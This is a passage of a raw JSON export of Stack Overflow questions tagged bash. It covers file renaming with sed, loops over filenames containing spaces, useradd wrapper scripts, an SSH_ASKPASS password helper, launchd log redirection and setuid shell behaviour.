history:</p>\n\n<blockquote>\n  <p>The second and subsequent lines of a multi-line compound command are\n  not tested, and are added to the history regardless of the value of\n  <code>HISTCONTROL</code>.</p>\n</blockquote>\n\n<p>But I have tried this:</p>\n\n<pre><code>$ HISTCONTROL=ignorespace\n$  if [ -f /var/log/messages ]\n&gt; then\n&gt; echo \"/var/log/message exists.\"\n&gt; fi\n$ history | tail -2\n   18  HISTCONTROL=ignorespace\n   19  history | tail -2\n</code></pre>\n\n<p>Note that the <code>if</code> is leaded by a space. Why the second line of this <code>if</code> compound command still not appear in the history?</p>\n"},{"tags":["bash","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13215666,"title":"script for changing prefix of filename in bash","body":"<p>From</p>\n\n<pre><code>abcd_if_vb.c\nabcd_if_av.c\n</code></pre>\n\n<p>to</p>\n\n<pre><code>edfg_if_vb.c\nedfg_if_av.c\n</code></pre>\n\n<p>The problem is to catch what file have <code>abcd</code> prefix.</p>\n"},{"tags":["bash","terminal","sublimetext2"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":39,"score":1,"question_id":13217243,"title":"Sublime Text 2 and Terminal","body":"<p>So I'm trying to make it so that I can start Sublime Text 2 from the terminal through this command, given by the Sublime Text documentation:</p>\n\n<pre><code>ln -s \"/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl\" ~/bin/subl\n</code></pre>\n\n<p>But for some reason this is not working. I get this error from my terminal:</p>\n\n<pre><code>ln: /Users/connorblack/bin/subl: No such file or directory\n</code></pre>\n\n<p>Can anyone help me with this?</p>\n\n<p>Other details: I have SB2 in my Applications folder. I'm trying to do RoR development. </p>\n"},{"tags":["bash","loops","replace","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13189611,"title":"Replacing specific lines in multiple files using bash","body":"<p>I'm relatively new to bash scripting, having started out of the need to manage my simulations on supercomputers. I'm currently stuck on writing a script to change specific lines in my pbs files. </p>\n\n<p>There's 2 stages to my problem. First, I need to replace a number of lines in a text file (another script), and overwrite that file for my later use. The rough idea is:</p>\n\n<blockquote>\n  <p>Replace lines 27, 28 and 29 of <code>'filename005'</code> with <code>'text1=000'</code>, <code>'text2=005'</code> and <code>'text3=010'</code></p>\n</blockquote>\n\n<p>Next, I'd like to do that recursively for a set of text files with numbered suffixes, and the numbering influences the replaced text. </p>\n\n<p>My code so far is: </p>\n\n<pre><code>#!/bin/bash\nfor ((i = 1; i &lt; 10; i++))\n    do\n    let NUM=i*5\n    let OLD=NUM-5\n    let NOW=NUM\n    let NEW=NUM+5\n\n    let FILE=$(printf \"filename%03g\" $NUM)\n    sed \"27 c\\text1=$OLD\" $FILE\n    sed \"28 c\\text2=$NOW\" $FILE\n    sed \"29 c\\text3=$NEW\" $FILE\ndone\n</code></pre>\n\n<p>I know there are some errors in the last 4 lines of my code, and I'm still studying up on the proper way to implement <code>sed</code>. Appreciate any tips!</p>\n\n<p>Thanks!\nCS</p>\n"},{"tags":["linux","bash","ffmpeg"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":2532,"score":6,"question_id":6239350,"title":"How to extract duration time from ffmpeg output?","body":"<p>To get a lot of information about a media file one can do</p>\n\n<pre><code>ffmpeg -i &lt;filename&gt;\n</code></pre>\n\n<p>where it will output a lot of lines, one in particular</p>\n\n<pre><code>Duration: 00:08:07.98, start: 0.000000, bitrate: 2080 kb/s\n</code></pre>\n\n<p>I would like to output only <code>00:08:07.98</code>, so I try</p>\n\n<pre><code>ffmpeg -i file.mp4 | grep Duration| sed 's/Duration: \\(.*\\), start/\\1/g'\n</code></pre>\n\n<p>But it prints everything, and not just the length.</p>\n\n<p>Even <code>ffmpeg -i file.mp4 | grep Duration</code> outputs everything.</p>\n\n<p>How do I get just the duration length?</p>\n"},{"tags":["arrays","bash","script"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1029,"score":1,"question_id":6426142,"title":"To append each element fo a string array in Bash","body":"<p>I have an array, each element being a string. How to write code in Bash to append each element with another string? or is it possible in Bash? In java, the code should be sth like,</p>\n\n<pre><code>for(int i=0; i&lt;array.length; i++)\n{\n    array[i].append(\"content\");\n}\n</code></pre>\n"},{"tags":["bash","haxe"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13213701,"title":"Get output of shell command in Haxe","body":"<p>In Haxe, is there a method in the Sys class (or some other class) that returns the output of a shell command (for example, the command \"ls\"), or will I need to implement this method myself for each target language? I'd like to find a method for invoking shell commands that works with every Haxe target language.</p>\n"},{"tags":["python","bash","makefile"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":54,"score":-2,"question_id":13210412,"title":"python execution through makefile","body":"<p>When I execute the python script through Makefile I'm getting this error which was not present earlier.</p>\n\n<p><strong>Error is:</strong></p>\n\n<pre class=\"lang-css prettyprint-override\"><code>/bin/bash: -c: line 0: unexpected EOF while looking for matching `\"'\n/bin/bash: -c: line 3: syntax error: unexpected end of file\n</code></pre>\n\n<p>Can anyone please help me in this regard what may be the issue?</p>\n\n<p>Following is the snippet of my Makefile </p>\n\n<pre><code>generate: python $(path)/generate.py \n</code></pre>\n\n<p>And i use command \"make generate\" Makefile is in the working directory and script is in the path</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13206311,"title":"Bash - function with optional arguments and missing logic","body":"<p>I'm trying make simple function for the useradd command and to quickly improve my poor shell programming skills.</p>\n\n<pre><code>useradd -m -g [initial_group] -G [additional_groups] -s [login_shell] [username]\n</code></pre>\n\n<p>Right now I'm somewhat unsure how to function with optional arguments.  After some Googling and I think might have a handle on that, just need to play around the code.</p>\n\n<p>One thing that I'm unsure about is the logic and I'm curious on how you guys would go about writing this.  I'm sure it will be better then what I could hack together.</p>\n\n<hr>\n\n<p>Here is how I going to try setup my function arguments, for the login shell and the initial group I would them to have generic defaults.</p>\n\n<pre><code>arg1 - userName, required\narg2 - loginShell, optional (default: /bin/bash)\narg3 - initGroup, optional (default: users)\narg4 - otherGroups, optional (default: none)\n</code></pre>\n\n<p>This is some lame pseudo code on how I'm thinking to structure this.</p>\n\n<pre><code>function addUser( userName, loginShell, initGroup, otherGroups){\n// Not how I would go about this but you should get the point\n  string bashCmd = \"useradd -m -g \";\n\n// Adding the initial user group\n  if(initGroup == null){\n    bashCmd += \"users\";\n  } else {\n    bashCmd += initGrop;\n  }\n\n// Adding any additional groups\n  if(otherGropus != null){\n    bashCmd += \" -G \" + otherGroups;\n  }\n\n  if(loginShell == null){\n    bashCmd += \" -s /bin/bash \" + userName;\n  } else {\n    bashCmd += \" -s \" + loginShell + \" \" + userName;\n  }\n}\n</code></pre>\n\n<hr>\n\n<p>These are the links I'm going by</p>\n\n<p><a href=\"http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-8.html\" rel=\"nofollow\">http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-8.html</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/6212219/passing-parameters-to-a-bash-function\">Passing parameters to a bash function</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/9332802/how-to-write-a-bash-script-that-takes-optional-input-arguments\">How to write a bash script that takes optional input arguments?</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/13197207/using-functions-inside-here-document\">Using Functions inside here document</a></p>\n"},{"tags":["bash","gnu","unix-utils"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13214978,"title":"\"ensure\" like utility for adding content into .*rc files","body":"<p>I am looking for a command line utility, similar to a puppet \"ensure\" to install\nsome function or some string content in a given resource file, eg., .bashrc. without clobbering existing text or duplicating the entry on reinstall.</p>\n\n<p>This could be done with comment placeholders if need be.</p>\n\n<p>This would be more efficient than appending the same contents to the .bashrc etc. IMO.</p>\n"},{"tags":["bash","loops","whitespace"],"answer_count":16,"favorite_count":29,"up_vote_count":56,"down_vote_count":0,"view_count":51344,"score":56,"question_id":301039,"title":"How can I escape white space in a bash loop list?","body":"<p>I have a bash shell script that loops through all child directories (but not files) of a certain directory.  The problem is that some of the directory names contain spaces.  </p>\n\n<p>Here are the contents of my test directory:</p>\n\n<pre><code>$ls -F test\nBaltimore/  Cherry Hill/  Edison/  New York City/  Philadelphia/  cities.txt\n</code></pre>\n\n<p>And the code that loops through the directories:</p>\n\n<pre><code>for f in `find test/* -type d`; do\n  echo $f\ndone\n</code></pre>\n\n<p>Here's the output:</p>\n\n<pre>\ntest/Baltimore\ntest/Cherry\nHill\ntest/Edison \ntest/New\nYork\nCity\ntest/Philadelphia\n</pre>\n\n<p>Cherry Hill and New York City are treated as 2 or 3 separate entries.</p>\n\n<p>I tried quoting the filenames, like so:</p>\n\n<pre><code>for f in `find test/* -type d | sed -e 's/^/\\\"/' | sed -e 's/$/\\\"/'`; do\n  echo $f\ndone\n</code></pre>\n\n<p>but to no avail.</p>\n\n<p>There's got to be a simple way to do this.</p>\n\n<hr>\n\n<p>The answers below are great.  But to make this more complicated - I don't always want to use the directories listed in my test directory.  Sometimes I want to pass in the directory names as command-line parameters instead.</p>\n\n<p>I took Charles' suggestion of setting the IFS and came up with the following:</p>\n\n<pre><code>dirlist=\"${@}\"\n(\n  [[ -z \"$dirlist\" ]] &amp;&amp; dirlist=`find test -mindepth 1 -type d` &amp;&amp; IFS=$'\\n'\n  for d in $dirlist; do\n    echo $d\n  done\n)\n</code></pre>\n\n<p>and this works just fine unless there are spaces in the command line arguments (even if those arguments are quoted).  For example, calling the script like this: <code>test.sh \"Cherry Hill\" \"New York City\"</code> produces the following output:</p>\n\n<pre>\nCherry\nHill\nNew\nYork\nCity\n</pre>\n"},{"tags":["bash","sed","awk"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":61,"score":4,"question_id":13201392,"title":"Removing all duplicate entries in a field","body":"<p>I have a file that is of the following format:</p>\n\n<pre><code>text   number   number   A;A;A;A;A;A\ntext   number   number   B\ntext   number   number   C;C;C;C;D;C;C;C;C\n</code></pre>\n\n<p>What I want to do is remove all repeats of the entries in the fourth column to end up with this:</p>\n\n<pre><code>text   number   number   A\ntext   number   number   B\ntext   number   number   C;D\n</code></pre>\n\n<p>I'd prefer to use bash scripting for a solution to fit into a pipe with other text manipulation I'm doing to this file.</p>\n\n<p>Thanks!</p>\n"},{"tags":["osx","bash","find","xargs"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13184700,"title":"Using find and exec to create directories and then work with relative path to that directory","body":"<p>I have a bunch of .emlx Apple Mail files in structured folders, which I would like to import into Apple Mail. I know I can do this manually, by renaming the folder to folder.mbox, and then placing the .emlx files in a nested folder called \"Messages.\"</p>\n\n<p>I have hundreds of these folders, so I'm attempting to do it with bash instead of manually.</p>\n\n<p>I can set up the basic structure like so:</p>\n\n<pre><code>find /path/to/folders/* -type d -exec mv {} {}.mbox \\; -exec mkdir {}.mbox/Messages \\;\n</code></pre>\n\n<p>But I'm having trouble figuring out how to move the .emlx files into the newly created subfolder. I tried this:</p>\n\n<pre><code>find /path/to/folders/ -name \\*.emlx -print0 | xargs -0 -I {} mv {} ./Messages/\n</code></pre>\n\n<p>... which I figured was a long shot, but surely there's some way of dealing with the list of files that <code>find</code> generates relative to each result's path.</p>\n"},{"tags":["bash","ssh"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13211229,"title":"bash setsid & read freezes","body":"<p>I have script for ssh login without expect:</p>\n\n<pre><code>function do_auth_connect(){\n    if [ -n \"$SSH_ASKPASS_TMPFILE\" ]; then\n        cat \"$SSH_ASKPASS_TMPFILE\"\n        exit 0\n    elif [ $# -lt 1 ]; then\n        echo \"Usage: echo password | $0 &lt;ssh command line options&gt;\" &gt;&amp;2\n        exit 1\n    fi\n\n    sighandler() {\n        rm \"$TMP_PWD\"\n    }\n\n    TMP_PWD=$(mktemp)\n    chmod 600 \"$TMP_PWD\"\n    trap 'sighandler' SIGHUP SIGINT SIGQUIT SIGABRT SIGKILL SIGALRM SIGTERM\n\n    export SSH_ASKPASS=$0\n    export SSH_ASKPASS_TMPFILE=$TMP_PWD\n\n    [ \"$DISPLAY\" ] || export DISPLAY=dummydisplay:0\n    read password\n    echo $password &gt;&gt; \"$TMP_PWD\"\n\n    # use setsid to detach from tty\n    #exec setsid \"$@\"\n    setsid \"$@\"\n\n    rm \"$TMP_PWD\"\n}\n</code></pre>\n\n<p>If I use command like:</p>\n\n<pre><code>echo \"my_password\" | do_auth_connect ssh use@domain \"uname -a\"\n</code></pre>\n\n<p>all work fine. But if I use:</p>\n\n<pre><code>read password\necho \"$password\" | do_auth_connect ssh use@domain \"uname -a\"\n</code></pre>\n\n<p>script freezes.</p>\n\n<p>\"set -x\" shows that the script goes into a loop, and wait another \"read\" param.</p>\n\n<p>How I can fix this? Thanks</p>\n\n<p><strong>---UPD---</strong> (for @Barmar)</p>\n\n<p>set -x output when ok (with scp example):</p>\n\n<pre><code>+ echo 'user_password'\n+ do_auth_connect scp -P 444 user@domain:/home/user/dbg.log /home/user/dbg.log\n+ '[' -n '' ']'\n+ '[' 5 -lt 1 ']'\n++ mktemp\n+ TMP_PWD=/tmp/tmp.X8TKTIchq6\n+ chmod 600 /tmp/tmp.X8TKTIchq6\n+ trap sighandler SIGHUP SIGINT SIGQUIT SIGABRT SIGKILL SIGALRM SIGTERM\n+ export SSH_ASKPASS=./1.sh\n+ SSH_ASKPASS=./1.sh\n+ export SSH_ASKPASS_TMPFILE=/tmp/tmp.X8TKTIchq6\n+ SSH_ASKPASS_TMPFILE=/tmp/tmp.X8TKTIchq6\n+ '[' :0.0 ']'\n+ read password\n+ echo 'user_password'\n+ setsid scp -P 444 user@domain:/home/user/dbg.log /home/user/dbg.log\n+ echo 'user_password'\n+ do_auth_connect scp -P 444 user@domain:/home/user/dbg.log /home/user/dbg.log\n+ '[' -n /tmp/tmp.X8TKTIchq6 ']'\n+ cat /tmp/tmp.X8TKTIchq6\n+ exit 0\n+ rm /tmp/tmp.X8TKTIchq6\n+ exit\n</code></pre>\n\n<p>and when fails:</p>\n\n<pre><code>+ read pass\n&gt; user_password\n+ echo 'user_password'\n+ do_auth_connect scp -P 444 user@domain:/home/user/dbg.log /home/user/dbg.log\n+ '[' -n '' ']'\n+ '[' 5 -lt 1 ']'\n++ mktemp\n+ TMP_PWD=/tmp/tmp.7usdmtHgqt\n+ chmod 600 /tmp/tmp.7usdmtHgqt\n+ trap sighandler SIGHUP SIGINT SIGQUIT SIGABRT SIGKILL SIGALRM SIGTERM\n+ export SSH_ASKPASS=./1.sh\n+ SSH_ASKPASS=./1.sh\n+ export SSH_ASKPASS_TMPFILE=/tmp/tmp.7usdmtHgqt\n+ SSH_ASKPASS_TMPFILE=/tmp/tmp.7usdmtHgqt\n+ '[' :0.0 ']'\n+ read password\n+ echo 'user_password'\n+ setsid scp -P 444 user@domain:/home/user/dbg.log /home/user/dbg.log\n+ read -p '&gt; ' pass\n</code></pre>\n\n<p>and this is all, ^C does not work :)</p>\n\n<p><strong>---UPD2---</strong></p>\n\n<p>I found out that any \"read\" breaks the script\nFor example:</p>\n\n<pre><code>read null\necho \"user_password\" | do_auth_connect scp -P 444 user@domain:/home/user/dbg.log ~/dbg.log\n</code></pre>\n\n<p>have some troubles with freezes</p>\n"},{"tags":["bash","variables","background","subprocess","global"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":13207292,"title":"bash background process modify global variable","body":"<p>I have a global var foo=\"some value\" and a background process back_func, I want to the background process to access $foo and modify its value, which can be seen by the main process. It's something like the following:</p>\n\n<pre><code>#!/bin/bash\nfoo=0\n\nfunction back_func {\n     foo=$(($foo+1))\n     echo \"back $foo\"\n}\n\n(back_func) &amp;\necho \"global $foo\"\n</code></pre>\n\n<p>The result of the above script is </p>\n\n<pre><code>global 0\nback 1\n</code></pre>\n\n<p>How could I get the result of global and back are both '1'?, i.e. the back ground process's modification can return back to the main process.</p>\n"},{"tags":["bash","ubuntu"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":13061975,"title":"New User creation script error","body":"<p>I have the script listed below that I can't seem to get the issue worked out of.  I'm trying to make an interactive login script for a UNIX class that I'm in.  I'm basically building out a command to pass into <code>useradd</code>.  The command that I make when passed into the command line (while adding <code>sudo</code>) works as expected, but when I try to run it from my script (which is generating the text that I copy/paste into the command line) it gives me some errors...  At this point I'm at a loss for what to try next to resolve the issue.</p>\n\n<p><strong>ERROR:</strong></p>\n\n<pre><code>useradd -m --user-group jaredm2 #command that is attempting to run...\nuseradd: invalid option -- ' '\nUsage: useradd [options] LOGIN\n....rest of useradd error text....\n</code></pre>\n\n<p><strong>SCRIPT:</strong></p>\n\n<pre><code>#!/bin/bash\n#Add a new user\n\nFINALCOMMAND=\"-m\"\n\n#import useradd defaults...\n. /etc/default/useradd\n\n#Check if running as root\nif [ \"$(id -u)\" != \"0\" ]; then\n    echo \"This script must be ran as root\"\n    exit 1\nfi\n\n#Get the new users Name\n#echo -n \"Please enter the users First and Last Name and press [ENTER]: \"\n#read Name\n\n#Get the new users username\necho \"The username must be 4-20 characters.\"\necho -n \"Please enter the users requested username and press [ENTER]: \"\nread USERNAME\nwhile [ $(grep -c \"^${USERNAME}:\" /etc/passwd) -ge 1 ] || [ ${#USERNAME} -le 3 ] || [ ${#USERNAME} -ge 21 ]\ndo\n    echo \" \"\n    echo \"Error: Username is in use or invalid.  Please select a different username.\"\n    echo \" \"\n    echo -n \"Please enter the users requested username and press [ENTER]: \"\n    read USERNAME   \ndone #USERNAME will be valid from this point\n\n#ASK about the default shell now\necho -n \"Enter the new shell if you would like one (currently $SHELL) or leave blank for the default and press [ENTER]: \"\nread tempSHELL\nif [ ${#tempSHELL} -ge 1 ]; then\n    SHELL=\"$tempSHELL\"\n    FINALCOMMAND=\"$FINALCOMMAND \"\"-s $SHELL\"\nfi\n\n#ASK about a different primary group\necho \"Would you like to enter a non-default primary user group? Defaults to creating a new group that matches the username\"\necho \"Enter a new Primary Group or leave blank for the default and press [ENTER]: \"\nread newPrimaryGroup\n\nif [ ${#newPrimaryGroup} -eq 0 ]; then\n    FINALCOMMAND=\"$FINALCOMMAND --user-group\"\nelse\n    if [ $(grep -c \"^${newPrimaryGroup}\" /etc/group) -ge 1 ]; then\n        FINALCOMMAND=\"$FINALCOMMAND -g $newPrimaryGroup\"\n    else\n        echo \"Invalid group specified reverting to default!\"\n        FINALCOMMAND=\"$FINALCOMMAND --user-group\"\n    fi\nfi\nuseradd -m --user-group jaredm2\n#ASK about additional groups\necho \"Would you like the new user to be a part of any additional groups?  Leave blank if no additional groups are needed or enter additional groups in the format of GROUP1,GROUP2,... (NO SPACES) and press [ENTER]: \"\nread extraGroups\n#remove spaces if the user entered any\nextraGroups=\"${extraGroups//[[:space:]]}\"\nFINALEXTRAGROUPS=\"\"\nIFS=\",\"\nfor g in $extraGroups\ndo\n    if [ $(grep -c \"^${g}\" /etc/group) -ge 1 ]; then\n        FINALEXTRAGROUPS=\"$FINALEXTRAGROUPS,$g\"\n    else\n        echo \"$g is invalid user will not be added...\"\n    fi\ndone\nFINALEXTRAGROUPS=$(echo \"$FINALEXTRAGROUPS\" | tail -c +2)\nif [ ${#FINALEXTRAGROUPS} -ge 1 ]; then\n    FINALCOMMAND=\"$FINALCOMMAND -G $FINALEXTRAGROUPS\"\nfi\n\n#ASK about the home directory\necho \"Would you like to enter a new home directory for the user?  Leave blank to use the default of $HOME/$USERNAME or enter your own and press [ENTER]: \"\nread NEWHOME\n\nif [ ${#NEWHOME} -ge 1 ]; then\n    FINALCOMMAND=\"$FINALCOMMAND -d $NEWHOME\"\nfi\n\n#ADD the username to the command\nFINALCOMMAND=`echo \"$FINALCOMMAND $USERNAME\" | sed 's/ *$//g' | sed 's/^ *//g'`\necho \"useradd $FINALCOMMAND\"\n#PASSCOMMAND=\"sudo passwd $USERNAME\"\n#ADD THE USER\n`useradd $FINALCOMMAND`\n\n`passwd $USERNAME`\n\n`chfn $USERNAME`\n</code></pre>\n\n<p><strong>UPDATE: ADDED DEBUG CONTENT</strong></p>\n\n<pre><code>+ '[' 0 -ge 1 ']'\n++ sed 's/^ *//g'\n++ sed 's/ *$//g'\n++ echo '/usr/sbin/useradd -m -U JaredM'\n+ FINALCOMMAND='/usr/sbin/useradd -m -U JaredM'\n++ '/usr/sbin/useradd -m -U JaredM'\n./addnewuser.sh: line 89: /usr/sbin/useradd -m -U JaredM: No such file or directory\n</code></pre>\n"},{"tags":["python","bash","shell","echo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13211614,"title":"Is there equivalent functionality for 'echo -en ...' in python?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/6169217/replace-console-output-in-python\">Replace console output in python</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying to write a program that outputs information including updates to the command line. What I mean by updates is, for example, if files are being processed by the program, perhaps it will keep an updated count of the files processed so far. So <code>1 file</code> is replaced with <code>2 files</code> and then with <code>3 files</code> and so forth.</p>\n\n<p>The following is a sample piece of code that counts out some files and then displays a <a href=\"http://stackoverflow.com/questions/238073/how-to-add-a-progress-bar-to-a-shell-script\">loading bar</a>:</p>\n\n<pre><code>#!/bin/bash\n\nfor a in {1..10}\ndo\n    echo -ne \" $a files processed.\\r\"\n    sleep 1\ndone\necho \"\"\necho -ne '#####                     (33%)\\r'\nsleep 1\necho -ne '#############             (66%)\\r'\nsleep 1\necho -ne '#######################   (100%)\\r'\necho -ne '\\n'\n</code></pre>\n\n<p>Basically, the command line output gets periodically overwritten giving the effect of a primitive text-based animation in the terminal.</p>\n\n<p>There are two problems here:</p>\n\n<ol>\n<li>From what I know from doctors, the <code>echo</code> command is not portable at all.</li>\n<li>I want to do this in a python program, not with a bash file.</li>\n</ol>\n\n<p>Is there a way to achieve functionality similar to this using python?</p>\n"},{"tags":["osx","bash","scripting","launchd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13207365,"title":"How can I add arguments to OSX launchd plist to pipe output to a log file?","body":"<p>I have tried many different variation on this but just can't get it to work.</p>\n\n<p>I have a plist file:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n        &lt;key&gt;Label&lt;/key&gt;\n        &lt;string&gt;com.ilium007.handbrake&lt;/string&gt;\n        &lt;key&gt;ProgramArguments&lt;/key&gt;\n        &lt;array&gt;\n                &lt;string&gt;/bin/bash&lt;/string&gt;\n                &lt;string&gt;/Users/ilium007/support/scripts/handbrake/handbrake.sh &amp;gt;&amp;gt; /Users/ilium007/support/scripts/handbrake/logs/handbrake_encode.log&lt;/string&gt;\n                &lt;!--&lt;string&gt;&amp;gt;&amp;gt;&lt;/string&gt;--&gt;\n                &lt;!--&lt;string&gt;/Users/ilium007/support/scripts/handbrake/logs/handbrake_encode.log&lt;/string&gt;--&gt;\n        &lt;/array&gt;\n        &lt;key&gt;RunAtLoad&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;StartInterval&lt;/key&gt;\n        &lt;integer&gt;60&lt;/integer&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>\n\n<p>Note the comments in there.</p>\n\n<p>I want to pipe output from the handbrake.sh script to a log file and have tried to do so but keep getting A \"no such file\" error in system.log on OSX.</p>\n\n<pre><code>Nov  3 18:03:54 macmini com.ilium007.handbrake[15348]: /bin/bash: /Users/ilium007/support/scripts/handbrake/handbrake.sh &gt;&gt; /Users/ilium007/support/scripts/handbrake/logs/handbrake_encode.log: No such file or directory Nov  3 18:03:54 macmini com.apple.launchd.peruser.501[162] (com.ilium007.handbrake[15348]): Exited with code: 127\n</code></pre>\n\n<p>If I change the plist to the following, it runs but I get no log so I assume it is only running the first argument:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n        &lt;key&gt;Label&lt;/key&gt;\n        &lt;string&gt;com.ilium007.handbrake&lt;/string&gt;\n        &lt;key&gt;ProgramArguments&lt;/key&gt;\n        &lt;array&gt;\n                &lt;string&gt;/bin/bash&lt;/string&gt;\n                &lt;string&gt;/Users/ilium007/support/scripts/handbrake/handbrake.sh&lt;/string&gt;\n                &lt;string&gt;&amp;gt;&amp;gt;&lt;/string&gt;\n                &lt;string&gt;/Users/ilium007/support/scripts/handbrake/logs/handbrake_encode.log&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;RunAtLoad&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;StartInterval&lt;/key&gt;\n        &lt;integer&gt;60&lt;/integer&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>\n\n<p>The command that I would like to run via launchd is:</p>\n\n<pre><code>/Users/ilium007/support/scripts/handbrake/handbrake.sh &gt;&gt; /Users/ilium007/support/scripts/handbrake/logs/handbrake_encode.log\n</code></pre>\n\n<p>Nothing ever appears in the log file. But if I run that command from the terminal I get content in the log. Any help would be appreciated.</p>\n"},{"tags":["bash","shell","ubuntu"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13210880,"title":"Replace one substring for another string in shell script","body":"<p>I have \"i love Suzi and Marry\" and i want change \"Suzi\" to \"Sara\"</p>\n\n<pre><code>#!/bin/bash\n firstString=i love Suzi and Marry\n secondString=Sara\ndo something...\n</code></pre>\n\n<p>and a the result must be next:</p>\n\n<pre><code>firstString=i love Sara and Marry\n</code></pre>\n\n<p>Maybe someone can help me here?</p>\n"}]}
{"total":16352,"page":3,"pagesize":100,"questions":[{"tags":["json","bash","curl","escaping"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":38,"score":0,"question_id":13210184,"title":"Substituting INTO double quotes?","body":"<p>How do I substitute a thing INTO the double quotes:</p>\n\n<pre><code>curl -u \"bk322:$passw\" https://api.github.com/user/repos -d \"{'name':\"$title\"}\"\n</code></pre>\n\n<p>I can't make it</p>\n\n<pre><code>\"{'name':\\\"$title\\\"}\"\n</code></pre>\n\n<p>because this way JSON parser doesn't understand what I mean.</p>\n"},{"tags":["bash","sudo","bash-completion"],"answer_count":3,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":4491,"score":10,"question_id":5560442,"title":"how to run two commands in sudo?","body":"<p>is there any way how I can run two db2 commands from a command line? (it will be called from php exec command)</p>\n\n<ol>\n<li><strong>db2 connect to ttt</strong> (note that we need to have the connection live for the second command</li>\n<li><p><strong>db2 UPDATE CONTACT SET EMAIL_ADDRESS = 'mytestaccount@gmail.com'</strong></p>\n\n<p>sudo -su db2inst1 db2 connect to ttt; db2 UPDATE CONTACT SET EMAIL_ADDRESS = 'mytestaccount@gmail.com'</p></li>\n</ol>\n\n<p>the first command finishes correctly but the second one <code>SQL1024N  A database connection does not exist.  SQLSTATE=08003</code></p>\n\n<h1>NOTE</h1>\n\n<p>I need to run this as php user. Command <code>sudo -u db2inst1 id</code> as <strong>php</strong> user gives me correct output.</p>\n"},{"tags":["bash","unix","process","procfs"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13209796,"title":"Current value of process' environment variable","body":"<p>I was wondering if there is a way to set an environment variable from a bash process and read it from another.</p>\n\n<p>As environment variables' values are local to processes (besides the inheritance), one can't just do <code>export FOO=\"bar\"</code> in a terminal and read it from another.\nI was then trying to get them through <code>/proc/environ</code>, but this is what I got:</p>\n\n<pre><code>etuardu@subranu:~$ FOO=\"foo\" bash\netuardu@subranu:~$ strings /proc/$$/environ | grep FOO\nFOO=foo\netuardu@subranu:~$ export FOO=\"bar\"\netuardu@subranu:~$ strings /proc/$$/environ | grep FOO\nFOO=foo\netuardu@subranu:~$ echo $FOO\nbar\n</code></pre>\n\n<p>It seems I can just get the value that that environment variable had when the process started.<br>\nHow about its current value?</p>\n"},{"tags":["bash","symlink","privileges","setuid"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13209215,"title":"/bin/sh does not drop privileges","body":"<p>Hello stackoverflow guys,</p>\n\n<p>I have written a C program that simply invokes a bash shell using system(\"/bin/bash\")</p>\n\n<p>If i enable the setuid permission bit and execute the program, the invoked shell does not have euid set to 0. This is ok, because we know that bash shell drop privileges.</p>\n\n<p>BUT if i change /bin/sh to point to /bin/bash using sudo ln -s /bin/bash /bin/sh</p>\n\n<p>and then execute system with /bin/sh as an argument then the new invoked shell has euid=0. </p>\n\n<p>I am working on ubuntu 10.04</p>\n\n<p>Why this happens?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":340,"score":1,"question_id":6068929,"title":"String manipulation in 